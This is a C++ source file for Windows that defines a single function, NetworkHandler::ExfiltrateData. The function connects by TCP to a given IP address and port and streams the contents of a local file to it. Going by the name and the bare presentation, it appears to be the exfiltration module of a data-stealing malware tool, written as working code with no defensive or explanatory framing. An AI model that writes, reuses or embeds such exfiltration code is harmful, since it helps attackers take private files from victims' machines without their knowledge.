#include "NetworkHandler.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "Ws2_32.lib")

namespace NetworkHandler {
    bool ExfiltrateData(const std::string& filePath, const std::string& ip, int port) {
        WSADATA wsaData;
        SOCKET sock = INVALID_SOCKET;
        struct sockaddr_in server;

        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed." << std::endl;
            return false;
        }

        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed." << std::endl;
            WSACleanup();
            return false;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            std::cerr << "Connection failed." << std::endl;
            closesocket(sock);
            WSACleanup();
            return false;
        }

        // Send the file contents
        std::ifstream file(filePath, std::ios::binary);
        if (file) {
            char buffer[4096];
            while (file.read(buffer, sizeof(buffer)) || file.gcount() > 0) {
                send(sock, buffer, file.gcount(), 0);
            }
            std::cout << "File sent successfully." << std::endl;
        } else {
            std::cerr << "Failed to open file for sending." << std::endl;
        }

        file.close();
        closesocket(sock);
        WSACleanup();
        return true;
    }
}
